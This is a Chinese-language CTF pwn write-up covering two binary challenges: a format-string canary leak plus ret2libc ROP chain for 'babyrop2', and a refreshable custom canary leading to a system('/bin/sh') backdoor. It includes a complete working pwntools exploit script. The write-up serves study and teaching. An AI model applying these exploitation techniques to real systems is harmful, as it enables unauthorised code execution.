最近这段时间应该会陆陆续续补上以前做的pwn题的wp，再来复习一下
Involved Knowledge
Format String
Stackoverflow
ret2libc

Checksec    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

64位，开启了Canary(金丝雀)和NX(堆栈不可执行)，那么如果有canary的话，我们在进行rop时首先就是要泄露canary
Analyzemainint __cdecl main(int argc, const char **argv, const char **envp)
&#123;
  init(argc, argv, envp);
  gift();
  vuln();
  return 0;
&#125;

main函数里面依次执行三个函数init(),gift(),vuln()，依次跟进
init()unsigned __int64 init()
&#123;
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  puts(&quot;Can u return to libc ?&quot;);
  puts(&quot;Try u best!&quot;);
  return __readfsqword(0x28u) ^ v1;
&#125;

setvbuf进行了初始化了输入输出流该如何缓冲，将缓冲置零
gift()unsigned __int64 gift()
&#123;
  char format[8]; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts(&quot;I&#39;ll give u some gift to help u!&quot;);
  __isoc99_scanf(&quot;%6s&quot;, format);
  printf(format);
  puts(byte_400A05);
  fflush(0LL);
  return __readfsqword(0x28u) ^ v2;
&#125;

 __isoc99_scanf(&quot;%6s&quot;, format);  printf(format);
这里有format string，我们可以尝试泄露出canary，通过gdb找到canary的偏移
unsigned __int64 vuln()
&#123;
  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts(&quot;Pull up your sword and tell me u story!&quot;);
  read(0, buf, 0x64uLL);
  return __readfsqword(0x28u) ^ v2;
&#125;

这里是个stackoverflow，buf只有0x18大小，但是read的长度是0x64，我们可以在这里写ropchain
分析到这里结束
我们拿到canary后在rop时把canary放到它原来的位置上就行，后面跟上了p64(0)是因为还有8个字节才覆盖到返回地址，然后打ropchain
EXP    # Arch:     amd64-64-little
    # RELRO:    Partial RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x400000)

from pwn import *
from LibcSearcher import *
context(os = &#39;linux&#39; , arch = &#39;amd64&#39; , log_level = &#39;debug&#39;)
local = 1
if local == 0:
    io = remote(&#39;1.14.71.254&#39; , 28377)
else:
    io = process(&#39;/mnt/c/Users/M1sceden4/Desktop/pwn/babyrop2_bjdctf_2020&#39;)
elf = ELF(&#39;/mnt/c/Users/M1sceden4/Desktop/pwn/babyrop2_bjdctf_2020&#39;)
io.recvuntil(&quot;I&#39;ll give u some gift to help u!\n&quot;)
payload = b&#39;%7$p&#39;
io.sendline(payload)
canary = int(io.recv(18) , 16)
success(&#39;canary = &#39; + hex(canary))

puts_got = elf.got[&#39;puts&#39;]
puts_plt = elf.plt[&#39;puts&#39;]
main = elf.sym[&#39;main&#39;]
pop_rdi_ret = 0x0000000000400993
ret = 0x00000000004005f9
vuln = elf.sym[&#39;vuln&#39;]
payload = b&#39;a&#39; * (0x20 - 0x8) + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
io.recvuntil(&#39;Pull up your sword and tell me u story!\n&#39;)
io.sendline(payload)
puts_addr = u64(io.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
success(&#39;puts_addr = &#39; + hex(puts_addr))

libc = LibcSearcher(&#39;puts&#39; , puts_addr)
libc_base = puts_addr - libc.dump(&#39;puts&#39;)
success(&#39;libc_base = &#39; + hex(libc_base))

system = libc_base + libc.dump(&#39;system&#39;)
bin_sh = libc_base + libc.dump(&#39;str_bin_sh&#39;)
success(&#39;system = &#39; + hex(system))
success(&#39;bin_sh &#39; + hex(bin_sh))
payload = b&#39;a&#39; * (0x20 - 0x8) + p64(canary) + p64(0) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
io.recvuntil(&quot;I&#39;ll give u some gift to help u!\n&quot;)
io.sendline(&#39;1&#39;)
io.recvuntil(&#39;Pull up your sword and tell me u story!\n&#39;)
io.sendline(payload)
io.interactive()

Analyse
sub_4012B6()

unsigned int sub_4012B6()
&#123;
  int v0; // eax
  int fd; // [rsp+Ch] [rbp-4h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  fd = open(&quot;/dev/urandom&quot;, 0);
  if ( fd == -1 )
  &#123;
    printf(&quot;can&#39;t open /dev/urandom&quot;);
    exit(-1);
  &#125;
  read(fd, &amp;qword_4040D0, 8uLL);
  close(fd);
  v0 = time(0LL);
  srand(v0 ^ qword_4040D0);
  return alarm(0x14u);
&#125;

这里通过time()时间戳和qword_4040D0作为seed，进行一个随机数的生成

sub_4013EC()

__int64 sub_4013EC()
&#123;
  __int64 result; // rax
  char buf[88]; // [rsp+0h] [rbp-70h] BYREF
  __int64 v2; // [rsp+58h] [rbp-18h]
  int v3; // [rsp+68h] [rbp-8h]
  int v4; // [rsp+6Ch] [rbp-4h]

  v4 = 0;
  qword_4040D0 = (__int64)rand() &lt;&lt; 32;
  qword_4040D0 += rand();
  v2 = qword_4040D0;
  puts(&quot;I have a secret. Can you find it?&quot;);
  while ( !v4 )
  &#123;
    sub_401381();
    v3 = READ();
    switch ( v3 )
    &#123;
      case 2:
        printf(&quot;My secret is %016lx\n&quot;, qword_4040D0);
        qword_4040D0 = (__int64)rand() &lt;&lt; 32;
        qword_4040D0 += rand();
        v2 = qword_4040D0;
        printf(&quot;But now, I have a new Secret.&quot;);
        break;
      case 3:
        v4 = 1;
        break;
      case 1:
        puts(&quot;Show me the code:&quot;);
        read(0, buf, 0x100uLL);
        break;
    &#125;
  &#125;
  result = qword_4040D0;
  if ( v2 != qword_4040D0 )
  &#123;
    printf(&quot;Hey, What are you doing?&quot;);
    exit(0);
  &#125;
  return result;
&#125;

case2:输出qword_4040D0，并且将rand()生成的随机数值左移运算32后赋给qword_4040D0，接着再加上一个随机数值，将qword_4040D0赋给v2，这个v2就起到一个canary的作用
case1:stackoverflow
程序退出前检查v2的值是否被改动过，如果与之前不等，则crash掉
.text:0000000000401573 ; __unwind &#123;
.text:0000000000401573                 endbr64
.text:0000000000401577                 push    rbp
.text:0000000000401578                 mov     rbp, rsp
.text:000000000040157B                 lea     rdi, aBinSh     ; &quot;/bin/sh&quot;
.text:0000000000401582                 call    _system
.text:0000000000401587                 nop
.text:0000000000401588                 pop     rbp
.text:0000000000401589                 retn
.text:0000000000401589 ; &#125; // starts at 401573

程序有后门函数，我们可以利用/bin/sh
-0000000000000070 buf             db 88 dup(?)
-0000000000000018 anonymous_0     dq ?              //v2
-0000000000000010                 db ? ; undefined
-000000000000000F                 db ? ; undefined
-000000000000000E                 db ? ; undefined
-000000000000000D                 db ? ; undefined
-000000000000000C                 db ? ; undefined
-000000000000000B                 db ? ; undefined
-000000000000000A                 db ? ; undefined
-0000000000000009                 db ? ; undefined
-0000000000000008 var_8           dd ?             //v4
-0000000000000004 var_4           dd ?
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)

栈的一个分布，v2在buf的下方，我们在利用stackoverflow的时候会将v2覆盖掉，这样退出程序必然会crash
逻辑漏洞：如果我们先利用stackoverflow漏洞，ROP，调用system，构造system(“&#x2F;bin&#x2F;sh”)，再采用case2来生成canary，qword_4040D0的值会被赋给v2，这样虽然刚才v2被覆盖掉，但是现在已经是新生成的canary的值了，退出程序不会crash
刚拿到这道题的时候我在预测canary的值，没想到这么简单
